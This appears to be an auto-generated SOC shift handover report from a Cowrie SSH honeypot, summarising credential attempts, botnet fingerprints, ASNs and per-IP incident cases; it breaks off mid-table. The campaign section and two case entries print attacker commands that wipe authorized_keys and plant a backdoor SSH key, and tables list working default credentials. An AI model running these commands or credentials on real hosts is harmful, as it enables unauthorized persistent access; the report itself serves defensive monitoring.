# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-15 |
| **Generated At** | 2026-07-15T23:01:11Z |
| **Shift Time** | 23:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **98** |
| Confirmed Threats | **72** |
| False Positives Filtered | **26** (26.5%) |
| Unique Attacker IPs | **64** |
| Countries of Origin | **26** |
| High Severity Cases | **43** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **55** |
| Malware Samples Analyzed | **3** HIGH · **34** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **61** |
| Unique Credential Pairs | **26** |
| Unique Usernames | **16** |
| Unique Passwords | **24** |
| Successful Auth Pairs | **51** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 16 |
| `admin` | 8 |
| `support` | 4 |
| `centos` | 4 |
| `debian` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 5 |
| `admin` | 4 |
| `support` | 4 |
| `qwerty12` | 4 |
| `345gs5662d34` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 4 |
| `support` | `support` | 4 |
| `centos` | `qwerty12` | 4 |
| `debian` | `123456` | 4 |
| `345gs5662d34` | `345gs5662d34` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `P@$$w0rd` | `136.56.34.147` | 2026-07-15T20:55:16 |
| `admin` | `P@$$w0rd` | `111.70.23.238` | 2026-07-15T20:55:24 |
| `root` | `root11` | `196.189.126.185` | 2026-07-15T20:58:24 |
| `root` | `root11` | `122.160.142.194` | 2026-07-15T20:58:33 |
| `ubuntu` | `Admin` | `103.61.122.229` | 2026-07-15T21:00:50 |
| `rancher` | `123456` | `14.103.114.136` | 2026-07-15T21:05:27 |
| `345gs5662d34` | `345gs5662d34` | `14.103.114.136` | 2026-07-15T21:05:31 |
| `rancher` | `3245gs5662d34` | `14.103.114.136` | 2026-07-15T21:05:33 |
| `music` | `music` | `122.160.142.194` | 2026-07-15T21:12:38 |
| `root` | `root#2025` | `51.75.124.205` | 2026-07-15T21:14:24 |
| `345gs5662d34` | `345gs5662d34` | `51.75.124.205` | 2026-07-15T21:14:26 |
| `root` | `3245gs5662d34` | `51.75.124.205` | 2026-07-15T21:14:27 |
| `admin` | `admin` | `47.252.16.44` | 2026-07-15T21:15:12 |
| `music` | `music` | `65.20.179.251` | 2026-07-15T21:16:10 |
| `music` | `music` | `125.23.255.134` | 2026-07-15T21:16:24 |
| `test` | `admin@123` | `187.8.3.230` | 2026-07-15T21:16:57 |
| `test` | `admin@123` | `111.70.23.253` | 2026-07-15T21:17:10 |
| `test` | `admin@123` | `10.0.0.73` | 2026-07-15T21:20:36 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-15T21:21:36 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-15T21:25:52 |
| `user` | `cisco123` | `182.79.218.101` | 2026-07-15T21:26:55 |
| `root` | `Ctyun@12345` | `101.96.230.94` | 2026-07-15T21:27:15 |
| `345gs5662d34` | `345gs5662d34` | `101.96.230.94` | 2026-07-15T21:27:19 |
| `user` | `cisco123` | `10.0.0.73` | 2026-07-15T21:27:20 |
| `root` | `3245gs5662d34` | `101.96.230.94` | 2026-07-15T21:27:21 |
| `support` | `support` | `176.53.159.196` | 2026-07-15T21:27:24 |
| `support` | `support` | `10.0.0.73` | 2026-07-15T21:28:44 |
| `root` | `Pass@word123!` | `185.242.3.195` | 2026-07-15T21:31:05 |
| `centos` | `qwerty12` | `103.103.53.44` | 2026-07-15T21:37:53 |
| `centos` | `qwerty12` | `59.120.8.61` | 2026-07-15T21:41:15 |
| `centos` | `qwerty12` | `10.0.0.73` | 2026-07-15T21:41:41 |
| `master` | `master` | `62.201.228.210` | 2026-07-15T21:42:00 |
| `root` | `Pass@word123!` | `10.0.0.73` | 2026-07-15T21:45:01 |
| `master` | `master` | `101.13.1.58` | 2026-07-15T21:45:30 |
| `master` | `master` | `210.13.99.66` | 2026-07-15T21:45:44 |
| `1111` | `1111` | `10.0.0.73` | 2026-07-15T21:52:36 |
| `root` | `administrator` | `103.61.122.229` | 2026-07-15T21:58:56 |
| `ubnt` | `techsupport` | `207.254.71.129` | 2026-07-15T22:06:59 |
| `ubnt` | `techsupport` | `202.138.229.190` | 2026-07-15T22:07:09 |
| `debian` | `123456` | `46.101.9.55` | 2026-07-15T22:13:50 |
| `debian` | `123456` | `196.188.187.205` | 2026-07-15T22:13:58 |
| `debian` | `123456` | `10.0.0.73` | 2026-07-15T22:17:43 |
| `root` | `quality` | `185.242.3.195` | 2026-07-15T22:23:58 |
| `user1` | `password` | `154.177.200.220` | 2026-07-15T22:31:06 |
| `user1` | `password` | `10.0.0.73` | 2026-07-15T22:31:25 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `162.216.150.109` | 2026-07-15T22:33:08 |
| `admin` | `admin888` | `120.234.232.184` | 2026-07-15T22:35:09 |
| `admin` | `admin888` | `10.0.0.73` | 2026-07-15T22:35:36 |
| `root` | `quality` | `10.0.0.73` | 2026-07-15T22:37:51 |
| `root` | `6666` | `92.62.74.41` | 2026-07-15T22:42:14 |
| `root` | `6666` | `10.0.0.73` | 2026-07-15T22:42:40 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **98** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 22 |
| libssh | 14 |
| Go SSH scanner | 11 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 22 | 21 |
| `f555226df196...` | Mirai/variant | 9 | 3 |
| `16443846184e...` | Generic scanner | 6 | 2 |
| `bf7dbf67fa9b...` | Mirai/variant | 2 | 1 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 22 | 21 | Mirai/variant |
| `f555226df196...` | libssh | 9 | 3 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 6 | 2 | Generic scanner |
| `95420f9d932d...` | libssh | 5 | 1 | — |
| `bf7dbf67fa9b...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `101.96.230.94`, `14.103.114.136`, `51.75.124.205`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **64** |
| Unique ASNs | **49** |
| High-Risk ASNs | **36** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 5 | MEDIUM |
| `AS396982` | Google LLC | 3 | LOW |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |
| `AS24757` | Ethio Telecom | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS46562` | Performive LLC | 2 | MEDIUM |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (42)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d8fcb19e6e7e

| Field | Detail |
|---|---|
| **Source IP** | `136.56.34[.]147` |
| **First Seen** | 2026-07-15 20:55 |
| **Last Seen** | 2026-07-15 20:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:55:16` | `cowrie.session.connect` |
| `2026-07-15 20:55:16` | `cowrie.client.version` |
| `2026-07-15 20:55:16` | `cowrie.client.kex` |
| `2026-07-15 20:55:16` | `cowrie.login.success` |
| `2026-07-15 20:55:17` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:55:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.56.34[.]147` to AbuseIPDB if not already reported
- [ ] Block `136.56.34[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4da8eb5f9bb6

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]238` |
| **First Seen** | 2026-07-15 20:55 |
| **Last Seen** | 2026-07-15 20:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:55:22` | `cowrie.session.connect` |
| `2026-07-15 20:55:22` | `cowrie.client.version` |
| `2026-07-15 20:55:22` | `cowrie.client.kex` |
| `2026-07-15 20:55:24` | `cowrie.login.success` |
| `2026-07-15 20:55:25` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:55:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]238` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58ade1800034

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]185` |
| **First Seen** | 2026-07-15 20:58 |
| **Last Seen** | 2026-07-15 20:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:58:22` | `cowrie.session.connect` |
| `2026-07-15 20:58:23` | `cowrie.client.version` |
| `2026-07-15 20:58:23` | `cowrie.client.kex` |
| `2026-07-15 20:58:24` | `cowrie.login.success` |
| `2026-07-15 20:58:25` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:58:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]185` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b132a06cd765

| Field | Detail |
|---|---|
| **Source IP** | `122.160.142[.]194` |
| **First Seen** | 2026-07-15 20:58 |
| **Last Seen** | 2026-07-15 20:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:58:30` | `cowrie.session.connect` |
| `2026-07-15 20:58:31` | `cowrie.client.version` |
| `2026-07-15 20:58:31` | `cowrie.client.kex` |
| `2026-07-15 20:58:33` | `cowrie.login.success` |
| `2026-07-15 20:58:34` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:58:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.142[.]194` to AbuseIPDB if not already reported
- [ ] Block `122.160.142[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-077bfd4b3ed6

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-15 21:00 |
| **Last Seen** | 2026-07-15 21:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:00:49` | `cowrie.session.connect` |
| `2026-07-15 21:00:49` | `cowrie.client.version` |
| `2026-07-15 21:00:49` | `cowrie.client.kex` |
| `2026-07-15 21:00:50` | `cowrie.login.success` |
| `2026-07-15 21:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00149c8d9699

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]136` |
| **First Seen** | 2026-07-15 21:05 |
| **Last Seen** | 2026-07-15 21:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:05:27` | `cowrie.session.connect` |
| `2026-07-15 21:05:27` | `cowrie.client.version` |
| `2026-07-15 21:05:27` | `cowrie.client.kex` |
| `2026-07-15 21:05:27` | `cowrie.login.success` |
| `2026-07-15 21:05:29` | `cowrie.session.params` |
| `2026-07-15 21:05:29` | `cowrie.command.input` |
| `2026-07-15 21:05:29` | `cowrie.command.failed` |
| `2026-07-15 21:05:29` | `cowrie.log.closed` |
| `2026-07-15 21:05:30` | `cowrie.session.params` |
| `2026-07-15 21:05:30` | `cowrie.command.input` |
| `2026-07-15 21:05:30` | `cowrie.session.file_download` |
| `2026-07-15 21:05:30` | `cowrie.log.closed` |
| `2026-07-15 21:05:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]136` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f74d33fb9d57

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]136` |
| **First Seen** | 2026-07-15 21:05 |
| **Last Seen** | 2026-07-15 21:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:05:30` | `cowrie.session.connect` |
| `2026-07-15 21:05:30` | `cowrie.client.version` |
| `2026-07-15 21:05:30` | `cowrie.client.kex` |
| `2026-07-15 21:05:31` | `cowrie.login.success` |
| `2026-07-15 21:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]136` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bff990ccaa43

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]136` |
| **First Seen** | 2026-07-15 21:05 |
| **Last Seen** | 2026-07-15 21:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:05:32` | `cowrie.session.connect` |
| `2026-07-15 21:05:32` | `cowrie.client.version` |
| `2026-07-15 21:05:32` | `cowrie.client.kex` |
| `2026-07-15 21:05:33` | `cowrie.login.success` |
| `2026-07-15 21:05:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]136` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d38d4e4ff610

| Field | Detail |
|---|---|
| **Source IP** | `122.160.142[.]194` |
| **First Seen** | 2026-07-15 21:12 |
| **Last Seen** | 2026-07-15 21:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:12:35` | `cowrie.session.connect` |
| `2026-07-15 21:12:36` | `cowrie.client.version` |
| `2026-07-15 21:12:36` | `cowrie.client.kex` |
| `2026-07-15 21:12:38` | `cowrie.login.success` |
| `2026-07-15 21:12:39` | `cowrie.direct-tcpip.request` |
| `2026-07-15 21:12:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.142[.]194` to AbuseIPDB if not already reported
- [ ] Block `122.160.142[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4324246b7166

| Field | Detail |
|---|---|
| **Source IP** | `47.252.16[.]44` |
| **First Seen** | 2026-07-15 21:14 |
| **Last Seen** | 2026-07-15 21:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:14:12` | `cowrie.session.connect` |
| `2026-07-15 21:14:12` | `cowrie.telnet.option` |
| `2026-07-15 21:14:12` | `cowrie.telnet.option` |
| `2026-07-15 21:15:12` | `cowrie.login.success` |
| `2026-07-15 21:15:13` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `47.252.16[.]44` to AbuseIPDB if not already reported
- [ ] Block `47.252.16[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9348f584cf06

| Field | Detail |
|---|---|
| **Source IP** | `51.75.124[.]205` |
| **First Seen** | 2026-07-15 21:14 |
| **Last Seen** | 2026-07-15 21:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:14:24` | `cowrie.session.connect` |
| `2026-07-15 21:14:24` | `cowrie.client.version` |
| `2026-07-15 21:14:24` | `cowrie.client.kex` |
| `2026-07-15 21:14:24` | `cowrie.login.success` |
| `2026-07-15 21:14:25` | `cowrie.session.params` |
| `2026-07-15 21:14:25` | `cowrie.command.input` |
| `2026-07-15 21:14:25` | `cowrie.command.failed` |
| `2026-07-15 21:14:25` | `cowrie.log.closed` |
| `2026-07-15 21:14:26` | `cowrie.session.params` |
| `2026-07-15 21:14:26` | `cowrie.command.input` |
| `2026-07-15 21:14:26` | `cowrie.session.file_download` |
| `2026-07-15 21:14:26` | `cowrie.log.closed` |
| `2026-07-15 21:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.124[.]205` to AbuseIPDB if not already reported
- [ ] Block `51.75.124[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c68f8a3ad378

| Field | Detail |
|---|---|
| **Source IP** | `51.75.124[.]205` |
| **First Seen** | 2026-07-15 21:14 |
| **Last Seen** | 2026-07-15 21:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:14:26` | `cowrie.session.connect` |
| `2026-07-15 21:14:26` | `cowrie.client.version` |
| `2026-07-15 21:14:26` | `cowrie.client.kex` |
| `2026-07-15 21:14:26` | `cowrie.login.success` |
| `2026-07-15 21:14:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.124[.]205` to AbuseIPDB if not already reported
- [ ] Block `51.75.124[.]205` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66c7210fac7e

| Field | Detail |
|---|---|
| **Source IP** | `51.75.124[.]205` |
| **First Seen** | 2026-07-15 21:14 |
| **Last Seen** | 2026-07-15 21:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:14:26` | `cowrie.session.connect` |
| `2026-07-15 21:14:26` | `cowrie.client.version` |
| `2026-07-15 21:14:27` | `cowrie.client.kex` |
| `2026-07-15 21:14:27` | `cowrie.login.success` |
| `2026-07-15 21:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.124[.]205` to AbuseIPDB if not already reported
- [ ] Block `51.75.124[.]205` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fabecf634b3

| Field | Detail |
|---|---|
| **Source IP** | `65.20.179[.]251` |
| **First Seen** | 2026-07-15 21:16 |
| **Last Seen** | 2026-07-15 21:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:16:09` | `cowrie.session.connect` |
| `2026-07-15 21:16:09` | `cowrie.client.version` |
| `2026-07-15 21:16:09` | `cowrie.client.kex` |
| `2026-07-15 21:16:10` | `cowrie.login.success` |
| `2026-07-15 21:16:11` | `cowrie.direct-tcpip.request` |
| `2026-07-15 21:16:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.179[.]251` to AbuseIPDB if not already reported
- [ ] Block `65.20.179[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e561a8666c9

| Field | Detail |
|---|---|
| **Source IP** | `125.23.255[.]134` |
| **First Seen** | 2026-07-15 21:16 |
| **Last Seen** | 2026-07-15 21:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:16:21` | `cowrie.session.connect` |
| `2026-07-15 21:16:21` | `cowrie.client.version` |
| `2026-07-15 21:16:21` | `cowrie.client.kex` |
| `2026-07-15 21:16:24` | `cowrie.login.success` |
| `2026-07-15 21:16:24` | `cowrie.direct-tcpip.request` |
| `2026-07-15 21:16:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.23.255[.]134` to AbuseIPDB if not already reported
- [ ] Block `125.23.255[.]134` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0db78163fec5

| Field | Detail |
|---|---|
| **Source IP** | `187.8.3[.]230` |
| **First Seen** | 2026-07-15 21:16 |
| **Last Seen** | 2026-07-15 21:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 21:16:54` | `cowrie.session.connect` |
| `2026-07-15 21:16:55` | `cowrie.client.version` |
| `2026-07-15 21:16:55` | `cowrie.client.kex` |
| `2026-07-15 21:16:57` | `cowrie.login.success` |
| `2026-07-15 21:16:57` | `cowrie.direct-tcpip.request` |
| `2026-07-15 21:17:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.3[.]230` to AbuseIPDB if not already reported
- [ ] Block `187.8.3[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d33c45e2c8b

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]253` |
| **First Seen** | 2026-07-15 21:17 |
| **Last Seen** | 2026-07-15 21:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
